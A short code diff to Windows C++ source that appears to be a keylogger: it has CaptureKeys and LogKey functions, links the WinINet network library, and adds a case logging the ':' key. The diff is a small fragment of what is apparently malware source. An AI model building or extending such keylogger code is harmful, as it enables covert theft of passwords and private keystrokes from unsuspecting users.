@@ -5,7 +5,6 @@
 #include <wininet.h>
 #include <thread>
 #include <fstream>
-#pragma comment(lib,"ws2_32.lib")
 #pragma comment(lib, "Wininet")
 using namespace std;
 
@@ -444,6 +443,9 @@ bool CaptureKeys(int key)
         return true;
     case 0x6F:
         LogKey((char*)"/");
+        return true;
+    case VK_OEM_1:
+        LogKey((char*)":");
         return true;
     default:
         return false;
